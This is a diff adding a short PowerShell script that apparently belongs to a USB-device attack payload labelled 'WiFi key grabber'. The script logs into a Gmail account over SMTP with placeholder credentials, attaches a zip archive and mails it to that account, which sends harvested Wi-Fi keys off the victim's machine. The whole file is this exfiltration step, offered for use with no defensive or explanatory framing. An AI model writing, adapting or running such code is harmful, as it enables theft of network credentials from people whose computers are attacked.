@@ -1,0 +1,11 @@
+﻿$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('[[Username]]@gmail.com', '[[Password]]')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = '[[Username]]@gmail.com'
+$ReportEmail.To.Add('[[Username]]@gmail.com')
+$ReportEmail.Subject = 'WiFi key grabber'
+$ReportEmail.Body = ('WifiPeensy')
+$ReportEmail.Attachments.Add('..\\A.zip')
+$SMTPInfo.Send($ReportEmail)
